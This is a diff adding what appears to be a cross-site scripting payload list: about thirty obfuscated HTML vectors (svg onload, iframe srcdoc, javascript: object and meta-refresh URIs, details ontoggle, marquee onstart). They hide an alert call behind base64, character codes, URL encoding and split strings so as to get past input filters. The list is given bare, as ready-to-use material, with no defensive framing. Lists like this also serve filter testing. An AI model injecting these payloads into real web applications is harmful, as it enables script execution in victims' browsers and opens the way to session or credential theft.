@@ -1,0 +1,33 @@
+```html
+<svg onload=window[&#x61;&#x6C;&#x65;&#x72;&#x74;](1)>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<object data="javascript:window['al'+'ert'](1)"></object>
+<meta http-equiv="refresh" content="0;url=javascript:eval(atob('YWxlcnQoMSk='))">
+<details open ontoggle=window['al'+'ert'](1)>
+<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>
+<iframe srcdoc="<svg onload=window['al'+'ert'](1)>"></iframe>
+<marquee onstart=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>
+<object data="javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></object>
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:window[\\'al\\'+\\'ert\\'](1)'>"></iframe>
+<img src=x onerror=eval('window[\\'al\\'+\\'ert\\'](1)')>
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')>
+<iframe srcdoc='<img src=x onerror=window["al"+"ert"](1)>'></iframe>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<svg onload=setTimeout('al'+'ert(1)',0)>"></iframe>
+<marquee onstart=window['al'+'ert'](1)></marquee>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<object data="javascript:eval(decodeURIComponent('%61%6C%65%72%74(1)'))"></object>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"></iframe>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>
+<iframe srcdoc='<svg onload=eval("window[\\'al\\'+\\'ert\\'](1)")>'></iframe>
+<object data="javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></object>
+<svg onload=eval('window[\\'al\\'+\\'ert\\'](1)')>
+<object data="javascript:eval(atob('YWxlcnQoMSk='))"></object>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:eval(atob(\\'YWxlcnQoMSk=\\'))'>"></iframe>
+<object data="javascript:window['al'+'ert'](1)"></object>
+<details open ontoggle=eval('window[\\'al\\'+\\'ert\\'](1)')>
+```
